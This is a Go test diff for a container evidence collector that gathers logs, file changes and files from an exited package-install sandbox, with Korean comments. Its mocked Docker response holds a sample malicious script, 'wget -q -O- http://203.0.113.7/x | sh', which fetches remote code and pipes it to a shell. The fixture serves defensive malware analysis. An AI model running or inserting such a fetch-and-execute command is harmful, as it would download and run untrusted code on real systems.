@@ -1,8 +1,11 @@
 package evidence
 
 import (
+	"archive/tar"
 	"context"
 	"errors"
+	"net/http"
+	"net/http/httptest"
 	"strings"
 	"testing"
 	"time"
@@ -221,4 +224,59 @@ func TestBeforeKillHookNeverPanics(t *testing.T) {
 	ctx, cancel := context.WithCancel(context.Background())
 	cancel()
 	hook(ctx, cid) // 이미 끝난 ctx 로도 터지지 않는다
+}
+
+// 이미 끝난 컨테이너(11/16 「끝난 컨테이너도 증거는」): 실제 Docker 응답 모양(sg-vm Docker 29.8 실측 — inspect · logs · changes · archive 200, top 409)
+// 으로 dockerapi.Client 를 그대로 써서 모은다. top 409 는 빠진 부분으로만 남고(패닉 · 대기 없음) 로그 · 파일 변경 · 설치 스크립트는 저장된다
+func TestCollectExitedContainer(t *testing.T) {
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		switch {
+		case strings.HasSuffix(r.URL.Path, "/json"):
+			_, _ = w.Write([]byte(`{"Id":"` + cid + `","Name":"/sg-install-pip-9","Config":{"Image":"python:3.12-slim"},"State":{"Pid":0,"Running":false}}`))
+		case strings.HasSuffix(r.URL.Path, "/logs"):
+			_, _ = w.Write([]byte("Collecting reqeusts\nRunning setup.py install\n"))
+		case strings.HasSuffix(r.URL.Path, "/changes"):
+			_, _ = w.Write([]byte(`[{"Path":"/tmp","Kind":0},{"Path":"/tmp/payload.sh","Kind":1}]`))
+		case strings.HasSuffix(r.URL.Path, "/top"):
+			w.WriteHeader(http.StatusConflict)
+			_, _ = w.Write([]byte(`{"message":"container ` + cid + ` is not running"}`))
+		case strings.HasSuffix(r.URL.Path, "/archive") && r.URL.Query().Get("path") == "/tmp/payload.sh":
+			body := "wget -q -O- http://203.0.113.7/x | sh\n"
+			tw := tar.NewWriter(w)
+			_ = tw.WriteHeader(&tar.Header{Name: "payload.sh", Mode: 0o755, Size: int64(len(body)), Typeflag: tar.TypeReg})
+			_, _ = tw.Write([]byte(body))
+			_ = tw.Close()
+		default:
+			w.WriteHeader(http.StatusNotFound)
+		}
+	}))
+	defer srv.Close()
+	dc, err := dockerapi.New("tcp://" + strings.TrimPrefix(srv.URL, "http://"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	mem := store.NewMemory()
+	start := time.Now()
+	ev, err := New(dc, mem).Collect(context.Background(), cid)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if elapsed := time.Since(start); elapsed > Budget/2 {
+		t.Fatalf("an exited container must not wait for the budget: %v", elapsed)
+	}
+	if !ev.Partial || !strings.Contains(ev.Error, "top") || strings.Contains(ev.Error, "timeout") {
+		t.Fatalf("only top is missing: partial=%v err=%q", ev.Partial, ev.Error)
+	}
+	if ev.Processes == nil || len(ev.Processes) != 0 {
+		t.Fatalf("process list is empty (not nil): %#v", ev.Processes)
+	}
+	if ev.ContainerName != "sg-install-pip-9" || !strings.Contains(ev.Logs, "setup.py install") || len(ev.Changes) != 2 {
+		t.Fatalf("logs · changes kept: %+v", ev)
+	}
+	if len(ev.Files) != 1 || ev.Files[0].Path != "/tmp/payload.sh" || !strings.Contains(ev.Files[0].Content, "203.0.113.7") {
+		t.Fatalf("install script kept: %+v", ev.Files)
+	}
+	if got, _ := mem.EvidenceByContainer(context.Background(), cid); len(got) != 1 {
+		t.Fatalf("saved = %d", len(got))
+	}
 }
